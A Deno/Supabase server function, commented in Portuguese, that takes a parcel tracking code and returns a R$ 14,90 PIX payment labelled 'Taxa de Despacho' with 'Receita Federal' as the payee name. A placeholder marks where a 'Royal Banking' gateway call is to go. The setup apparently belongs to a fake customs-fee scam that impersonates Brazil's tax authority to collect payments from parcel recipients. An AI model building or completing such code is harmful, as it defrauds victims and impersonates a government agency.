import { serve } from "https://deno.land/std@0.190.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.45.0'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { trackingCode } = await req.json();

    if (!trackingCode) {
      throw new Error("Tracking code is required");
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const id_transaction = `tax_${trackingCode}`;

    // =========================================================================
    // AQUI VOCÊ INTEGRA A ROYAL BANKING
    // Substitua o código abaixo pela chamada real para a API da Royal Banking
    // usando Deno.env.get('ROYALBANKING_API_KEY')
    // =========================================================================
    
    // PIX de R$ 14,90 simulado (Substitua pelo retorno da Royal Banking)
    const mockPixCopiaECola = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-426614174000520400005303986540514.905802BR5913Receita Federal6008Brasilia62140510TAXA1234566304A1B2";

    // Salva ou atualiza a transação como pendente na sua tabela
    const { error } = await supabase
      .from('pix_gateway_payments')
      .upsert({
        id_transaction,
        status: 'pending',
        raw_payload: { pix: mockPixCopiaECola, amount: 14.90, description: "Taxa de Despacho" }
      });

    if (error) {
      throw error;
    }

    return new Response(JSON.stringify({ 
      success: true, 
      pixCopiaECola: mockPixCopiaECola
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 200,
    });

  } catch (error: any) {
    console.error("[create-tax-pix] Error:", error);
    return new Response(JSON.stringify({ error: error.message }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    });
  }
})